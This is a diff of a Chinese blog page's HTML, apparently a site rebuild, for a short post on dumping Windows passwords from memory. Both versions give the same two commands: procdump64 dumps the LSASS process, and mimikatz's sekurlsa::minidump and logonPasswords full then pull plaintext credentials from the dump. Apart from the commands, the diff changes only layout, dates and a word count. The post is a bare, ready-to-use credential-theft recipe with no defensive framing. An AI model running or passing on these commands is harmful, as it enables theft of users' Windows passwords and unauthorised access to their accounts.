@@ -86,17 +86,17 @@
 
 
 
-<meta name="description" content="两步完成利用procdump64+mimikatz获取win用户密码使用procdump64+mimikatz可实现从内存中获取明文密码1.导出lsass.exeprocdump64.exe -accepteula -ma lsass.exe lsass.dmp (注:必须使用管理员权限) 2.执行mimikatzmimikatz.exe  &amp;quot;sekurlsa::minidump lsa">
+<meta name="description" content="两步完成利用procdump64+mimikatz获取win用户密码  使用procdump64+mimikatz可实现从内存中获取明文密码1.导出lsass.exe  procdump64.exe -accepteula -ma lsass.exe lsass.dmp(注:必须使用管理员权限)  2.执行mimikatzmimikatz.exe  &amp;quot;sekurlsa::minidump">
 <meta property="og:type" content="article">
 <meta property="og:title" content="两步完成利用procdump64+mimikatz获取win用户密码">
 <meta property="og:url" content="http://MaiKeFee.com/archives/f86fa73d.html">
 <meta property="og:site_name" content="MaiKeFee|">
-<meta property="og:description" content="两步完成利用procdump64+mimikatz获取win用户密码使用procdump64+mimikatz可实现从内存中获取明文密码1.导出lsass.exeprocdump64.exe -accepteula -ma lsass.exe lsass.dmp (注:必须使用管理员权限) 2.执行mimikatzmimikatz.exe  &amp;quot;sekurlsa::minidump lsa">
+<meta property="og:description" content="两步完成利用procdump64+mimikatz获取win用户密码  使用procdump64+mimikatz可实现从内存中获取明文密码1.导出lsass.exe  procdump64.exe -accepteula -ma lsass.exe lsass.dmp(注:必须使用管理员权限)  2.执行mimikatzmimikatz.exe  &amp;quot;sekurlsa::minidump">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-09-05T03:41:48.680Z">
+<meta property="og:updated_time" content="2019-09-06T02:57:02.377Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="两步完成利用procdump64+mimikatz获取win用户密码">
-<meta name="twitter:description" content="两步完成利用procdump64+mimikatz获取win用户密码使用procdump64+mimikatz可实现从内存中获取明文密码1.导出lsass.exeprocdump64.exe -accepteula -ma lsass.exe lsass.dmp (注:必须使用管理员权限) 2.执行mimikatzmimikatz.exe  &amp;quot;sekurlsa::minidump lsa">
+<meta name="twitter:description" content="两步完成利用procdump64+mimikatz获取win用户密码  使用procdump64+mimikatz可实现从内存中获取明文密码1.导出lsass.exe  procdump64.exe -accepteula -ma lsass.exe lsass.dmp(注:必须使用管理员权限)  2.执行mimikatzmimikatz.exe  &amp;quot;sekurlsa::minidump">
 
 
 
@@ -357,8 +357,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-09-05T11:41:48+08:00">
-                2019-09-05
+              <time title="更新于" itemprop="dateModified" datetime="2019-09-06T10:57:02+08:00">
+                2019-09-06
               </time>
             
           </span>
@@ -462,7 +462,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  86
+                  88
                 </span>
               
 
@@ -499,7 +499,10 @@
       
 
       
-        <h1 id="两步完成利用procdump64-mimikatz获取win用户密码"><a href="#两步完成利用procdump64-mimikatz获取win用户密码" class="headerlink" title="两步完成利用procdump64+mimikatz获取win用户密码"></a>两步完成利用procdump64+mimikatz获取win用户密码</h1><h2 id="使用procdump64-mimikatz可实现从内存中获取明文密码"><a href="#使用procdump64-mimikatz可实现从内存中获取明文密码" class="headerlink" title="使用procdump64+mimikatz可实现从内存中获取明文密码"></a>使用procdump64+mimikatz可实现从内存中获取明文密码</h2><h3 id="1-导出lsass-exe"><a href="#1-导出lsass-exe" class="headerlink" title="1.导出lsass.exe"></a>1.导出lsass.exe</h3><pre><code>procdump64.exe -accepteula -ma lsass.exe lsass.dmp</code></pre><p> (注:必须使用管理员权限)</p>
+        <h1 id="两步完成利用procdump64-mimikatz获取win用户密码"><a href="#两步完成利用procdump64-mimikatz获取win用户密码" class="headerlink" title="两步完成利用procdump64+mimikatz获取win用户密码"></a>两步完成利用procdump64+mimikatz获取win用户密码</h1><hr>
+<ul>
+<li>使用procdump64+mimikatz可实现从内存中获取明文密码<h3 id="1-导出lsass-exe"><a href="#1-导出lsass-exe" class="headerlink" title="1.导出lsass.exe"></a>1.导出lsass.exe</h3>  procdump64.exe -accepteula -ma lsass.exe lsass.dmp<br>(注:必须使用管理员权限)</li>
+</ul>
 <h3 id="2-执行mimikatz"><a href="#2-执行mimikatz" class="headerlink" title="2.执行mimikatz"></a>2.执行mimikatz</h3><pre><code>mimikatz.exe  &quot;sekurlsa::minidump lsass.dmp&quot;  &quot;sekurlsa::logonPasswords full&quot;  exit</code></pre><p>(注:必须使用管理员权限)</p>
 <h3 id="成功获取明文密码"><a href="#成功获取明文密码" class="headerlink" title="成功获取明文密码"></a>成功获取明文密码</h3>
       
@@ -530,7 +533,7 @@
   <p><span>本文标题:</span>两步完成利用procdump64+mimikatz获取win用户密码</p>
   <p><span>文章作者:</span>MaiKeFee</p>
   <p><span>发布时间:</span>2019年09月03日</p>
-  <p><span>最后更新:</span>2019年09月05日</p>
+  <p><span>最后更新:</span>2019年09月06日</p>
   <p><span>原始链接:</span><a href="/archives/f86fa73d.html" title="两步完成利用procdump64+mimikatz获取win用户密码">http://MaiKeFee.com/archives/f86fa73d.html</a>
     <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://MaiKeFee.com/archives/f86fa73d.html" aria-label="复制成功！"></i></span>
   </p>
@@ -782,7 +785,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#两步完成利用procdump64-mimikatz获取win用户密码"><span class="nav-number">1.</span> <span class="nav-text">两步完成利用procdump64+mimikatz获取win用户密码</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#使用procdump64-mimikatz可实现从内存中获取明文密码"><span class="nav-number">1.1.</span> <span class="nav-text">使用procdump64+mimikatz可实现从内存中获取明文密码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-导出lsass-exe"><span class="nav-number">1.1.1.</span> <span class="nav-text">1.导出lsass.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-执行mimikatz"><span class="nav-number">1.1.2.</span> <span class="nav-text">2.执行mimikatz</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#成功获取明文密码"><span class="nav-number">1.1.3.</span> <span class="nav-text">成功获取明文密码</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#两步完成利用procdump64-mimikatz获取win用户密码"><span class="nav-number">1.</span> <span class="nav-text">两步完成利用procdump64+mimikatz获取win用户密码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-导出lsass-exe"><span class="nav-number">1.0.1.</span> <span class="nav-text">1.导出lsass.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-执行mimikatz"><span class="nav-number">1.0.2.</span> <span class="nav-text">2.执行mimikatz</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#成功获取明文密码"><span class="nav-number">1.0.3.</span> <span class="nav-text">成功获取明文密码</span></a></li></ol></li></ol></div>
             
 
           </div>
